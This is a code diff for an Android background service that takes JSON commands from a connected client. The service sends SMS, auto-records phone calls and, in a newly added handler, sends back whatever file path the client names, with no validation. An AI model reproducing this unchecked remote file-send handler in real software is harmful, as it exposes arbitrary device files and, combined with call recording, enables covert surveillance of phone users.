@@ -11,10 +11,12 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.ServiceConnection;
+import android.content.pm.PackageManager;
 import android.hardware.usb.UsbManager;
 import android.net.Uri;
 import android.os.Binder;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
@@ -50,6 +52,7 @@ import org.json.JSONObject;
 import org.json.JSONTokener;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.List;
 
 
@@ -222,9 +225,9 @@ public class ServerService extends Service {
                             DDLog.i(QueryCompeleteCallback.class, "onQuerySuccess(),result=" + result);
                             mServerThread.sendMsg2Client(result);
                         }
+
                         @Override
                         public void onQueryFailure(Exception e) {
-
                         }
                     });
                     break;
@@ -252,11 +255,23 @@ public class ServerService extends Service {
                     int anInt = Settings.Global.getInt(getContentResolver(), Constants.HIDE_NUMBER, 0);
                     DDLog.i(ServerService.class, "hide_number=" + anInt);
                     break;
+                case Constants.EVENT_TYPE_PLAY2CALL:
+                    //TODO-播放音频文件到mic
+                    break;
+                case Constants.EVENT_TYPE_SENDFILE:
+                    //TODO 发送文件到客户端
+                    String filePath = cmdObj.getString(Constants.CMD_EVENT_VALUE);
+                    mServerThread.sendFile(filePath);
+                    DDLog.i(ServerService.class, "start download server");
+                    EventInfo ok = new EventInfo(Constants.EVENT_TYPE_SENDFILE, "ok");
+                    mServerThread.sendMsg2Client(ok.toJson());
+                    break;
             }
         } else {
             DDLog.i(ServerService.class, "not a valid json string!");
         }
     }
+
 
     private static void sendMsg(String cmdValue) {
 
@@ -285,7 +300,6 @@ public class ServerService extends Service {
             mServerThread.sendMsg2Client(new EventInfo("-1").toJson());
             return;
         }
-        // 建立自定义Action常数的Intent(给PendingIntent参数之用)
         Intent sendIntent = new Intent(SMS_SEND_ACTION);
         Intent deliverIntent = new Intent(SMS_DELIVERED_ACTION);
         // sentIntent参数为传送后接受的广播信息PendingIntent
@@ -320,7 +334,6 @@ public class ServerService extends Service {
                         break;
                     case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                     case SmsManager.RESULT_ERROR_NO_SERVICE:
-                    case SmsManager.RESULT_ERROR_LIMIT_EXCEEDED:
                     case SmsManager.RESULT_ERROR_RADIO_OFF:
                     case SmsManager.RESULT_ERROR_NULL_PDU:
                         break;
@@ -397,7 +410,7 @@ public class ServerService extends Service {
                         while (!mRecorder.getState().isIdle()) ;
                         DDLog.i(ServerReceiver.class, "start to recording");
                         mRecorder.start(mActivNumber);
-                    } else if (mCurrentState == Call.State.DISCONNECTED) {
+                    } else if (mCurrentState == Call.State.DISCONNECTED || mCurrentState == Call.State.DISCONNECTING) {
                         mRecorder.stop();
                     }
                 }
@@ -463,7 +476,6 @@ public class ServerService extends Service {
         DDLog.i(ServerBinder.class, "hello, this is ServerBinder");
     }
 
-    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         DDLog.i(ServerService.class, "onBind");
